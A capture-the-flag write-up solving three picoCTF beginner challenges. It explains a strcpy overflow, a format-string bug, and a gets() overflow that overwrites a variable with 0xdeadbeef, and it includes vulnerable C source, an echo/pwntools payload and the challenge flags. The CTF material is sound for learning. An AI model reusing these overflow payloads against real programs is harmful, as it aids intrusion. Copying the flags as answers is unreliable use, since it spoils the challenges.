# 1. buffer_overflow_0

> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
## Solution:

In source.c  we see:
```

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```
where
```
char buf1[100];
vuln(buf1);
```
hence if we overflow the buf1 with more than 16 characters we get segfault

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```


***
# 1. format_string_0

> Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 58247
## Solution:

- The moment I opened the program I noticed this `printf(choice1)` and `printf(choice2)` this is very exploitable and that's how we cause the program to return the flag
we see in the serve patrik function the menu is
```
char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
```
In this we see the 2nd vlue which contains `%114d` this will expand to a random value > 114 which is great 2*BUFSIZE i.e. 64 which will cause the serve_bob() function to run

then we see the seve_bob()'s i.e.
```
"Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
```
here unlike before we got `%s` in the 3rd option this unlike before will result in segafult because of invalid pointer that printf will try to expand

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

# 1. Challenge name

> Put in the challenge's description here

## Solution:

This program has a gets function.In this we know the size of input buffer 256 bytes, if I pass 256 random things into the buffer we might be able to overflow it, so I do so with `python -c "a"*256` but still code is 0x00,maybe the codde buffer somewhere further so now  I pass 300 a's instead of 256 from where we get 
```
code == 0x6161616161616161
code != 0xdeadbeef :(
```
then I tried 260 a's which resulted in 0x00 again but then I tried 265 wihch resulted in `0x61` and when I try 264 it again results in `0x00` which means code starts at 265, so we can overwrite it, i convert deadbeef to to little endian bytes by this : 
```
import pwn
sth =  pwn.p64(0xdeadbeef)
print(sth)
```
and copied it after the a's and then echoed it using this 
```
echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde\x00\x00\x00\x00" | ./chall
```
which then I did the same with nc version

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```


***


